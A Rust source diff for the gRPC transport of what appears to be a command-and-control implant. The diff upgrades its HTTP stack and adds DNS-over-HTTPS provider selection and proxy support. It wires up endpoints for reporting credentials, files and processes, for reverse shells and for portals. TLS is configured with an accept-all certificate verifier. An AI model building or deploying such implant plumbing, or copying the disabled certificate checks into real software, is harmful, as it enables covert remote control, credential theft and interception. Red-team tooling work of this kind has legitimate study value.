@@ -1,5 +1,5 @@
 use anyhow::Result;
-use hyper::Uri;
+use http::Uri;
 use pb::c2::*;
 use pb::config::Config;
 use std::str::FromStr;
@@ -9,17 +9,56 @@ use tonic::Request;
 
 #[cfg(feature = "doh")]
 use crate::dns_resolver::doh::DohProvider;
-
 use crate::Transport;
 
+use crate::tls_utils::AcceptAllCertVerifier;
+use std::sync::Arc;
 use std::time::Duration;
+
+#[derive(Clone)]
+struct ForceHttpsConnector<C> {
+    inner: C,
+    force: bool,
+}
+
+impl<C> tower::Service<http::Uri> for ForceHttpsConnector<C>
+where
+    C: tower::Service<http::Uri> + Clone + Send + 'static,
+    C::Response: Send,
+    C::Error: Send,
+    C::Future: Send,
+{
+    type Response = C::Response;
+    type Error = C::Error;
+    type Future = C::Future;
+
+    fn poll_ready(
+        &mut self,
+        cx: &mut std::task::Context<'_>,
+    ) -> std::task::Poll<std::result::Result<(), Self::Error>> {
+        self.inner.poll_ready(cx)
+    }
+
+    fn call(&mut self, uri: http::Uri) -> Self::Future {
+        if self.force {
+            let mut parts = uri.into_parts();
+            if parts.scheme == Some(http::uri::Scheme::HTTP) {
+                parts.scheme = Some(http::uri::Scheme::HTTPS);
+            }
+            let https_uri = http::Uri::from_parts(parts).expect("valid uri");
+            self.inner.call(https_uri)
+        } else {
+            self.inner.call(uri)
+        }
+    }
+}
 
 static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
 static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
 static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
 static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
 static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
-static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
+static REPORT_OUTPUT_PATH: &str = "/c2.C2/ReportOutput";
 static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";
 static CREATE_PORTAL_PATH: &str = "/c2.C2/CreatePortal";
 
@@ -39,39 +78,75 @@ impl Transport for GRPC {
         let callback = crate::transport::extract_uri_from_config(&config)?;
         let extra_map = crate::transport::extract_extra_from_config(&config);
 
-        let endpoint = tonic::transport::Endpoint::from_shared(callback)?;
+        // Tonic 0.14+ might fail with "Connecting to HTTPS without TLS enabled" if we use https:// scheme
+        // even if we provide a TLS-enabled connector. We workaround this by using http:// scheme
+        // internally and forcing https:// in the connector.
+        let internal_callback = if callback.starts_with("https://") {
+            callback.replacen("https://", "http://", 1)
+        } else {
+            callback.clone()
+        };
+
+        let endpoint = tonic::transport::Endpoint::from_shared(internal_callback)?;
 
         #[cfg(feature = "doh")]
         let doh: Option<&String> = extra_map.get("doh");
 
+        // Create base HTTP connector (either DOH-enabled or system DNS)
         #[cfg(feature = "doh")]
         let mut http = match doh {
-            // TODO: Add provider selection based on the provider string
-            Some(_provider) => {
-                crate::dns_resolver::doh::create_doh_connector(DohProvider::Cloudflare)?
+            Some(provider_str) => {
+                let provider = match provider_str.to_lowercase().as_str() {
+                    "cloudflare" => DohProvider::Cloudflare,
+                    "google" => DohProvider::Google,
+                    "quad9" => DohProvider::Quad9,
+                    _ => DohProvider::Cloudflare,
+                };
+                crate::dns_resolver::doh::create_doh_connector_hyper1(provider)?
             }
             None => {
                 // Use system DNS when DOH not explicitly requested
-                crate::dns_resolver::doh::create_doh_connector(DohProvider::System)?
+                crate::dns_resolver::doh::create_doh_connector_hyper1(DohProvider::System)?
             }
         };
 
         #[cfg(not(feature = "doh"))]
-        let mut http = hyper::client::HttpConnector::new();
+        let mut http = hyper_util::client::legacy::connect::HttpConnector::new();
 
         let proxy_uri = extra_map.get("http_proxy");
 
         http.enforce_http(false);
         http.set_nodelay(true);
 
+        let tls_config = rustls::ClientConfig::builder_with_provider(Arc::new(
+            rustls::crypto::ring::default_provider(),
+        ))
+        .with_safe_default_protocol_versions()
+        .expect("failed to set default protocol versions")
+        .dangerous()
+        .with_custom_certificate_verifier(Arc::new(AcceptAllCertVerifier))
+        .with_no_client_auth();
+
+        let connector = hyper_rustls::HttpsConnectorBuilder::new()
+            .with_tls_config(tls_config)
+            .https_or_http()
+            .enable_http2()
+            .wrap_connector(http);
+
+        // Wrap connector to force HTTPS if the original callback was HTTPS
+        let connector = ForceHttpsConnector {
+            inner: connector,
+            force: callback.starts_with("https://"),
+        };
+
         let channel = match proxy_uri {
             Some(proxy_uri_string) => {
-                let proxy: hyper_proxy::Proxy = hyper_proxy::Proxy::new(
-                    hyper_proxy::Intercept::All,
+                let proxy = hyper_http_proxy::Proxy::new(
+                    hyper_http_proxy::Intercept::All,
                     Uri::from_str(proxy_uri_string.as_str())?,
                 );
-                let mut proxy_connector = hyper_proxy::ProxyConnector::from_proxy(http, proxy)?;
-                proxy_connector.set_tls(None);
+                let proxy_connector =
+                    hyper_http_proxy::ProxyConnector::from_proxy(connector, proxy)?;
 
                 endpoint
                     .rate_limit(1, Duration::from_millis(25))
@@ -80,7 +155,7 @@ impl Transport for GRPC {
             #[allow(non_snake_case) /* None is a reserved keyword */]
             None => endpoint
                 .rate_limit(1, Duration::from_millis(25))
-                .connect_with_connector_lazy(http),
+                .connect_with_connector_lazy(connector),
         };
 
         let grpc = tonic::client::Grpc::new(channel);
@@ -163,11 +238,11 @@ impl Transport for GRPC {
         Ok(resp.into_inner())
     }
 
-    async fn report_task_output(
+    async fn report_output(
         &mut self,
-        request: ReportTaskOutputRequest,
-    ) -> Result<ReportTaskOutputResponse> {
-        let resp = self.report_task_output_impl(request).await?;
+        request: ReportOutputRequest,
+    ) -> Result<ReportOutputResponse> {
+        let resp = self.report_output_impl(request).await?;
         Ok(resp.into_inner())
     }
 
@@ -421,10 +496,10 @@ impl GRPC {
 
     ///
     /// Report execution output for a task.
-    pub async fn report_task_output_impl(
+    pub async fn report_output_impl(
         &mut self,
-        request: impl tonic::IntoRequest<ReportTaskOutputRequest>,
-    ) -> std::result::Result<tonic::Response<ReportTaskOutputResponse>, tonic::Status> {
+        request: impl tonic::IntoRequest<ReportOutputRequest>,
+    ) -> std::result::Result<tonic::Response<ReportOutputResponse>, tonic::Status> {
         if self.grpc.is_none() {
             return Err(tonic::Status::new(
                 tonic::Code::FailedPrecondition,
@@ -438,10 +513,10 @@ impl GRPC {
             )
         })?;
         let codec = pb::xchacha::ChachaCodec::default();
-        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_TASK_OUTPUT_PATH);
+        let path = tonic::codegen::http::uri::PathAndQuery::from_static(REPORT_OUTPUT_PATH);
         let mut req = request.into_request();
         req.extensions_mut()
-            .insert(GrpcMethod::new("c2.C2", "ReportTaskOutput"));
+            .insert(GrpcMethod::new("c2.C2", "ReportOutput"));
         self.grpc.as_mut().unwrap().unary(req, path, codec).await
     }
 
